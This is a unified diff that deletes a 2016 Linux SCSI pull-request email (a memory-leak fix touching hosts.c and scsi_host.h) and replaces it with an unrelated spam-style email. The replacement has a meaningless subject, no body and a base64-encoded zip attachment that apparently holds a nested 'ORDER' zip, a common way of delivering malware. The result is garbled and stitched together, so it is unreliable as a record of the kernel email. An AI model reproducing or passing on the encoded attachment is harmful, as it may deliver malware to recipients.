@@ -1,97 +1,97 @@
-From: James Bottomley <James.Bottomley@HansenPartnership.com>
-Subject: [GIT PULL] SCSI fixes for 4.8-rc8
-Date: Sat, 01 Oct 2016 15:36:12 +0800
-Message-ID: <1475307372.3881.13.camel@HansenPartnership.com>
+From: <aajunplzen@cmkos.cz>
+Subject: 1735 linux-scsi
+Date: Sat, 01 Oct 2016 19:11:15 -0000
+Message-ID: <147534907541.4187.2025776140427013891@vnpt.vn>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: 7bit
-Return-path: <linux-kernel-owner@vger.kernel.org>
-Sender: linux-kernel-owner@vger.kernel.org
-To: Andrew Morton <akpm@linux-foundation.org>, Linus Torvalds <torvalds@linux-foundation.org>
-Cc: linux-scsi <linux-scsi@vger.kernel.org>, linux-kernel <linux-kernel@vger.kernel.org>
+Content-Type: application/zip; name="EMAIL_2196004_linux-scsi.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-scsi-owner@vger.kernel.org>
+Received: from static.vnpt.vn ([14.164.187.150]:54088 "HELO vnpt.vn"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750949AbcJATLW (ORCPT <rfc822;linux-scsi@vger.kernel.org>);
+        Sat, 1 Oct 2016 15:11:22 -0400
+Content-Disposition: attachment
+Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
+To: linux-scsi@vger.kernel.org
 
-One final fix before 4.8: there's a memory leak triggered by turning
-scsi mq off due to the fact that we assume on host release that the
-already running hosts weren't mq based because that's the state of the
-global flag (even though they were), so fix it by tracking this on a
-per host host basis.
-
-The patch is available here:
-
-git://git.kernel.org/pub/scm/linux/kernel/git/jejb/scsi.git scsi-fixes
-
-The short changelog is:
-
-Bart Van Assche (1):
-      scsi: Avoid that toggling use_blk_mq triggers a memory leak
-
-And the diffstat:
-
- drivers/scsi/hosts.c     | 2 ++
- drivers/scsi/scsi.c      | 1 -
- drivers/scsi/scsi_priv.h | 1 +
- include/scsi/scsi_host.h | 5 +----
- 4 files changed, 4 insertions(+), 5 deletions(-)
-
-With full diff below.
-
-James
-
----
-
-diff --git a/drivers/scsi/hosts.c b/drivers/scsi/hosts.c
-index ba9af4a..ec6381e 100644
---- a/drivers/scsi/hosts.c
-+++ b/drivers/scsi/hosts.c
-@@ -486,6 +486,8 @@ struct Scsi_Host *scsi_host_alloc(struct scsi_host_template *sht, int privsize)
- 	else
- 		shost->dma_boundary = 0xffffffff;
- 
-+	shost->use_blk_mq = scsi_use_blk_mq;
-+
- 	device_initialize(&shost->shost_gendev);
- 	dev_set_name(&shost->shost_gendev, "host%d", shost->host_no);
- 	shost->shost_gendev.bus = &scsi_bus_type;
-diff --git a/drivers/scsi/scsi.c b/drivers/scsi/scsi.c
-index 1f36aca..1deb6ad 100644
---- a/drivers/scsi/scsi.c
-+++ b/drivers/scsi/scsi.c
-@@ -1160,7 +1160,6 @@ bool scsi_use_blk_mq = true;
- bool scsi_use_blk_mq = false;
- #endif
- module_param_named(use_blk_mq, scsi_use_blk_mq, bool, S_IWUSR | S_IRUGO);
--EXPORT_SYMBOL_GPL(scsi_use_blk_mq);
- 
- static int __init init_scsi(void)
- {
-diff --git a/drivers/scsi/scsi_priv.h b/drivers/scsi/scsi_priv.h
-index 57a4b99..85c8a51 100644
---- a/drivers/scsi/scsi_priv.h
-+++ b/drivers/scsi/scsi_priv.h
-@@ -29,6 +29,7 @@ extern int scsi_init_hosts(void);
- extern void scsi_exit_hosts(void);
- 
- /* scsi.c */
-+extern bool scsi_use_blk_mq;
- extern int scsi_setup_command_freelist(struct Scsi_Host *shost);
- extern void scsi_destroy_command_freelist(struct Scsi_Host *shost);
- #ifdef CONFIG_SCSI_LOGGING
-diff --git a/include/scsi/scsi_host.h b/include/scsi/scsi_host.h
-index 0dee7af..7e4cd53 100644
---- a/include/scsi/scsi_host.h
-+++ b/include/scsi/scsi_host.h
-@@ -771,12 +771,9 @@ static inline int scsi_host_in_recovery(struct Scsi_Host *shost)
- 		shost->tmf_in_progress;
- }
- 
--extern bool scsi_use_blk_mq;
--
- static inline bool shost_use_blk_mq(struct Scsi_Host *shost)
- {
--	return scsi_use_blk_mq;
--
-+	return shost->use_blk_mq;
- }
- 
- extern int scsi_queue_work(struct Scsi_Host *, struct work_struct *);
+UEsDBBQAAgAIACGgQUkciOsQAREAAAURAAAPABwAT1JERVItMTA1ODkuemlwVVQJAAPuB/BX7gfw
+V3V4CwABBAAAAAAEAAAAAHWYVzQcDNPHV6/LRlmCaFGCIDph9S6sqCGEiB59VwvRid77qg/RrRJW
+S/Tee41g2ahBsNF583zv3XvON+f8p50zFzMXc/HT1cLDpwHgAogBbAUKGuSzvgh9EADwlgUAoAAw
+AaB6yip6/ELPxCSlBBxhhgYkALxDomPjf+XpQwbAwQf8tf9z5llaCY8GksIXqAruWc8q/NQnDS+r
+cMfC31oGmYwOa42kDJZyyLPHgTl7QBdr29ImJnQhOI2tvq6roz45ku7sh66X2BW0nAzmwYe6OgxV
+d1lhA2h/sedHAmgE3D2DcG0P4J1nGgtLGp/8ENcoapxCZid30RYBkzWgXJh5IMLdlxw60bbQ04Jd
+dxRb8X/StKga3cLUhR1rrs96F6vrgW6g/+5fltsVx7/VHdN3akspnmt7xLbcjV3Q8BuF9H/rs9eP
+gqS5iescjjPN9e+3vg094mmW+R6R4dn8SujKfpWJ87Uci+bN43CQJiV/i+TyEGI8N1N3rwW531vc
+6Kut1efqAKvrTXxPzHU9iZTkxFV/0e+AYtbup19DCHpeVB+4mA8svVs0i3py5Nr4G1SDQaO2blsP
+jxvzmdte6LQtnTr8ktw08mZq3RSlaDJUItWrov8Qa72lfMDFvMSP+EAWrO7qK9LiJ+EBd85pNzrQ
+mq9KIWYobahPqnlgxtcPFNFXIjUOCQ7XepxOQaop7qc5/zNIm+fCNkObQNCjtwSIcJQJ0qGXDqot
+nEMdpyqVPVKPdfljumWymAL89ijzpUtZb/PvAqg8p3RTY0ButodMhdCCxlCvcBB+vmwLMiRS/Cw7
+7TdfV/VrC3hDU4u3n3WAZLD/CcOxyQ+c1Wi7rYTKSMXRqOvXBNesZ6RcljW93MHlLoqEFtzh+rVT
+f1DkrmIucbgAIPJXcaTbGfg9F7/Px4eysRPFEdtWbGVEODR5ZTWvhgO2kZIQZUU8FZJ5yunkuu0L
+JVMGBx4psI7L+gdB/IaGJ5kNG0amJwqkFcyRRnlgQ2HxBx1G45lHDWEvchg6BVOpKaUMBUutfdBf
+yQrhWgqEShoKDL28Yoq4uMPtx7P/hPT/NiQYovVJDXYXmkf/SgMnk2iAZCYMw7dMKwbCgND4G9ZY
+oJJQc6sDPMxMmKC1SWQ527UHA1wALn7uwZlVGFQEcJesuMn/nA7wnbEEo40unLtGCDfNHDayjUhM
+jXRTcHwWu4doqTvn0tJLvvqSslLvpqgvlOHuLGrguowXg2O499UWfz/1IvD+hPhAjw/jzCTS9PJU
+VkF8EhEljm99lnaIz1fPGCQNYKpjiEsZApB/setY10p9z560WLvN4CwYbG/JvR6aJWjEVmcXQfjF
+8ru5a/irt4w/FIkDkujvBdBOamZeRZYu9K+CG7vdzNyj51Mt2avY69e4qXC9qDqYMrzHoHr80cZ6
+UkntVDwIctf+2jUSpAHfBqdYUqk4K4YNOFh07VYoT5tMyYhjwYLAejbZoTnQqWom3FO5uMVpfB9V
+XiSnURXqJx1VhqQlCz9bDFOXVIy3pdaU+vwgHgt603mn8yukoc20kyqMlMrDiww++7G4Cv7o7AWZ
+xp4OfJw0aUpPAEHMPnZUNVDVVEVpjYxAwQj6K2HT3c9dORZt88kX1nfNoixO9zlI68qIo1D6RKyf
+RPUnO/fP0GQEjYx1gl7RzkOxROMvDckJPiMO3oJIC2HTGtdUV8NBMqrBcTyThl2WpuSKptE6w835
+Rc6GuyYkSPZLNFfeMXl6UVUijlkpVYy3/pnY5e5UEBWZuGLoseLidPvyPiu/uQZyHuQ8lwSqSwmX
+J/h7YBsShPLI3PieM+iVgCRr5puFxsSogR9MzZp0yGTZpW7669vJA7Z/GJ7TdAP+2XGkg0eIXGJ1
+jcOAubsV35/K0it2EyL70SHsFVHsQgX14bkn8VbU0TB9spZnOqfvaUiLOQsx2Qwoos+qt4dgSoDW
+P4Q97+gmn+7qngpN/WTcPJZnQauFEB/rcKwcGKDPziKbX/LpcwcR/UR8mTDQzEdkaIPwDSX9SMoI
+jGtf5FeHXcm4jNNE/eqikCQJTxpgU2bFYTWVDUyBqPXc4E2r5cMjsakZq8npm38o2p3wuuTtcIeB
+5tsRbgTHJyh18hLEevbvpanMRaEd8q3DYrwzFfraHEOSQqD4mv21FbUEBe8SArP6EPXTlrsGDu+N
+E+MQoRB0qrbUm8ZZdKOsSSJE0wxu9M7V8unIlxqQ8OHzGH5VYjAcJSKLSdvMtbxiHQUHuZHp2YAg
+akGV8P3Rn7+iahVVY3CkorzWprxFIRmHwkQrXxKIN0GOWTSznWnqRWvmvApjOQJCy7NL7tHj66zC
+Vo3DXzU7HryYe5RtTE4XLpTWkr1Jy63ZSoxKBBv4kNPaCdl90efbQoiIPIlEazAtFtLEmD/kFL3c
+O6GYDnGG9R2jBcaKwaruzXAlgiAFPzoHWvWYuxD/3geWowe6LkZs5crnNLTd7YOiJ0sjUn5ruI9O
+GPE9+P44zStatWvIOngtLmjg0o1auQNp49SOaeV4Ixy2hZmey7AtPKHCA7LfKUQXqEUWf5+zYowm
+KiAALCQzFFcQFL74irQctvSENssPx4AVgaSnhIUz6XtTMb5qhGxMTzgF2bLdLAsihtuZk43tTcmo
+dJGiUz5Dr2nftyGsBKh+lT2T0d+f2BOc9cM6AiqbAIqVdE/2xdPX8YSz2Dk3JUgzX38Y+Bhi/Fmc
+3im5OPLD+OrrnaZUGlolWOrdZ/pMDlYh4Kc/ecMFzJACg0QJVfHKfXd0sroxcZnEGK7eePMYHB/w
+jRAq27gaDtrYh0XLyajlAZLaCyv4W1lXzToNuJYUhB+ufj0OQFX2uEZG8+nsfcmx4q6MHUrTfdCs
+BlX3e9OSoodxmVwqv8V9yWTdWakn31f0WDRIoiz5cf7hi2zQuUmGNLcgwpIy+ZsYlOlmNlt1aiLb
+euURt7Y1sLrbOmT/swUHaptK7Nu8H3yFxHRQT4nxoD5YzNv3JjHx3Tk9o3etfq+XfBNbq79cuS7S
+gpOWfEAkQT91UT5j7rip6WO824jbK1QM65ZHhJcM7FGcRw5yhjjdLNS2JE8aINmlr5nNRUmj+y2L
+IvWRnhWDZNY3JoXRd7p9iLpyJD6siq4udJD0WPwHeeubSoAMucQjowIGklDB3iqK2Ii47dRfdNfC
+Yhmx+1h08TfKRnEfsA208onW9XIelbol3KmXtCWCWsZYw+vVg3ze0dPylPTXhXkAVOhqDO+luAxj
+0dujIAxNZYvEDqMIy47NiUWOBrY7yTwlQmfuJuvzcQ/BBi33QtdkvK27+RYm6+IhjzQkYXllnjcI
+yiAqqBB+LB3ElwPWxSoFmdEvsOKk68kkgyZLTMMqSH5CEJXhjhHTZA3XpmhRMx2n7LiafTcxodJJ
+NSeqUz0xcrHYFPgUai8eepgd6hBBzEDX4L+hWRMyV2FFiyvagxdqZqhX9jBaHFxB7N1GpsAqLZio
+AXkvJOpp/udTWC+Du12cs3YqsV3Fox7KUltZ5BtrlilY0NNCvGevKpkAkd4AfxmDCRxc5ajJM6ZD
+7+o2ecUpf+8abrgm+7QP59cYyvqz4GYZgWiuD/aUy9fi3MzWE438uOXTxL+ZXbrNHJ/lz1zbW9R5
+x+HOhW5hdVVYtGpTJKBV8TrP7WXS/oHQtvmJy7FRZfS+lLJflhMr1swvEgbvZFI+UQ2Yqp5PlJGg
+hBPJNxkkJEUPUBAH/nmz8X6aYgEyrfhM+ukCpLMI8TiO8JvKQakn1BxGtvTTgsCeg0iDo7ceUURy
+NVTjKGWLYzDmkTU7e+sYTdxp7ug1FAj4BN5hVXAO4PIP7UlDts+yvXu53acvHMYOORaevh50fwZ6
+4zvapYlMN1geL+iDsO9bTp5jhNKA/AXqPQ8+gZl72vRvIwuVvJDlTqN74f/clORFzI7D+UUygNe4
+ueTaEf2ZiRnjuQRzFaw2WtDn35PvQT6QjxohaogZMYbUHWn2JZdut1lzTgEixZg7rUoJmx5bINim
+i66bqiU/6Adeyt8nCPwlEkrj1FyzMriUt/vNHDOurCyrLT5p3YrJ7ihR1jh4+Fi1yFFZ2F0t/al5
+QZaxSMhyahmIYIUTJQqNO15kePizLQRgu4UPDSFpUHqPfRLLWZ/Ngvt6BikvpGUlrcrhEi55CBTu
+K1Nh7pdQq9aAJVu2lu7acL4ig+6+UG/nLMTZTGqgQXPE+tS4N3Qtf87ysWSBwTl2O0ua2rQI6hAQ
+UmaH2/QamxCeBmqhY4Y2tmoS/4Pux3XKUv4vywvPryBo9opBTupXEyCTnEWv+rpMTqUy/uqsCak9
+xcOCMUONQ6cvDDO07rucQIlRYlBG+XWaSJzzJdc1T+XbOPYmaD8srvkNOSNWz6+goAD39+T0fr2t
+bsCMdhG970a5YN0bgrulMXMxfaiDSuAPa4uCh5UYRb3yGMnxrAr+1RlCFfnAGbdhnu2c8mhbXgaM
+DiWKT8cdRSwDcwspdtLXBBSNNWnP6Rwi2Y12cZyTkjmGZPt2bKjxQmeesio1erJyUB2D7VDufH4k
+nnEqsIQlJI5nBUvdGzO8r1z2Hr3rOjm6FXC8mhOBPUHK58re+vyM5DJ0s7yxJWM9QueYmIONz5di
+BMt6QLVKUpJ3v4A85f416zvfHYPon4Z0WKLXtRXe+6oJskWSHymbhRaglj0Ux37/qBvvnnXUk/ZL
+rogLTH7MnlTbmpr6xJchJbnteTDio8rbnd26aUx21/chMXxx9T+Ujbe32dJHNXr2rctMDzbCeGHL
+WPvyzqOvTrzL16ilk5cp+tOqGocVWTOr3QlOE+jvLRrPNU8eZ+qTykG8pga2NAa1qmPSFfjendC1
+Q53a9uKpCyAW7hBUrS0+aejDo0TTrwshjaT1K2b9eYMSpX+6dr85SZAaEF8xa665KNCDKqzfZsYc
+bCLXS45EevGuwFE8LE1iIkGA2Vthf7P9mTKxHK4E9rdm8soZrRa3yMrDuSOKIgh8Rq8ud8HbjrIs
+kka+KE1VwQrQ0DyzfAbRDXSyL+YXEwl2GI0xJYemUrz0attuKxzbMeuOZ5Oy+i7VcOcCKzabVTJQ
+GXE4fd2objwmYPfMVDj1tXW5EsWuG9yFlxlnD+ssPyUesnaeHC2pbegqigRrOimtiGnPX6GssODn
+JWeSHi99571wGaaHpVjv0s2oTYLVHfCO4bFe/LVZ08XY9I3wYZv2MHfDYrvpCMbxkLSmgYYuluWT
+CUGWT+ImV3nkRWLFIZGN77TVi2KRMPKD39ljRH9sgAXnTj/25nLzfgSeYi+w725vNksT1n5e3ZyM
+LXT8bRl3YBZc398e193vr3R8bf8ZKCeHKW2C5uZbXPj2TJxDBf3PKhfuLhcWEmSuz+/H8gN9JAKu
+znaxvneX2XIoqJxcx41x9VHAHkvH/U3PiNxFb4bc94zpU/r9fs/JL8ibIyygCYxMFuL3H8SsTkBd
+rTcRpRPYT9tyH89X1wIGwHcwizt4x+kJKoxyDfLx/AyVSbmC/XMdeHu8CT3Hm+i7aQlfKV7T8jnd
++LDnmm8ReHNx2/b7ane74y7R4v6qHCJ7MnFzpXWfn5Cf//rCT+je53ykBvN2aP+L7/s3Pw43MPfx
+Ged9X1vWfO9tLmcD2yxaBa52W8Iy/u7lcYeRUxQehlUGvlAM7LhzPOwp6cBoBbocTkgnfPy83X51
+c+V6mx0YaHhNhB5mO9qWQ/id2t5hVe4rTZJGtkc2fb/dYCijDkYKTsxuRq7viXS1cHCZ8f4/OEH/
+L3UA4PxVcfC/2f+iCoL/oor/wRS6WgSE/53DARj8jQjQv9V/AFBLAQIeAxQAAgAIACGgQUkciOsQ
+AREAAAURAAAPABgAAAAAAAAAAACkgQAAAABPUkRFUi0xMDU4OS56aXBVVAUAA+4H8Fd1eAsAAQQA
+AAAABAAAAABQSwUGAAAAAAEAAQBVAAAAShEAAAAA
